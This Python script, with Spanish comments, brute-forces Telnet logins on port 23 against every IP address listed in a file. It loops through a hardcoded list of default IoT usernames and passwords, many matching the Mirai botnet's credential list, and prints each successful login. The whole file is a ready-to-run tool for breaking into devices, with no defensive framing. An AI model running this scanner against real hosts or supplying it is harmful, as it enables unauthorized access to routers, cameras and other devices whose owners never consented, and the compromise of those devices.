import telnetlib
import socket

# Lista completa de combinaciones user:password
combos = [
    ("Q666666", "666666"),
    ("888888", "888888"),
    ("admin", "1111"),
    ("admin", "1111111"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin1", "password"),
    ("admin", "4321"),
    ("admin", "7ujMko0admin"),
    ("admin", "admin"),
    ("administrator", "1234"),
    ("admin", "meinsm"),
    ("admin", "pass"),
    ("admin", "password"),
    ("admin", "smcadmin"),
    ("guest", "12345"),
    ("guest", "guest"),
    ("root", "1111"),
    ("root", "1234"),
    ("root", "12345"),
    ("root", "123456"),
    ("root", "7ujMko0admin"),
    ("root", "7ujMko0vizxv"),
    ("root", "admin"),
    ("root", "dreambox"),
    ("root", "ikwb"),
    ("root", "pass"),
    ("root", "password"),
    ("root", "realtek"),
    ("root", "root"),
    ("root", "system"),
    ("root", "vizxv"),
    ("root", "xc3511"),
    ("service", "service"),
    ("supervisor", "supervisor"),
    ("support", "support"),
    ("ubnt", "ubnt"),
]

def telnet_brute(ip):
    for user, password in combos:
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=5)
            tn.read_until(b"login: ", timeout=3)
            tn.write(user.encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=3)
            tn.write(password.encode('ascii') + b"\n")
            response = tn.read_until(b"$", timeout=3)

            if b"$" in response or b"#" in response or b">" in response:
                print(f"[+] Acceso exitoso: IP={ip} | Puerto=23 | Usuario={user} | Contraseña={password}")
                tn.close()
                return
            tn.close()
        except (EOFError, socket.timeout, ConnectionRefusedError, socket.error):
            continue

def main():
    try:
        with open("telnets.txt", "r") as file:
            ips = [line.strip() for line in file if line.strip()]
        print(f"[~] Total de IPs a escanear: {len(ips)}\n")
        for ip in ips:
            print(f"[~] Probando IP: {ip}")
            telnet_brute(ip)
    except FileNotFoundError:
        print("[!] Archivo 'telnets.txt' no encontrado.")

if __name__ == "__main__":
    main()
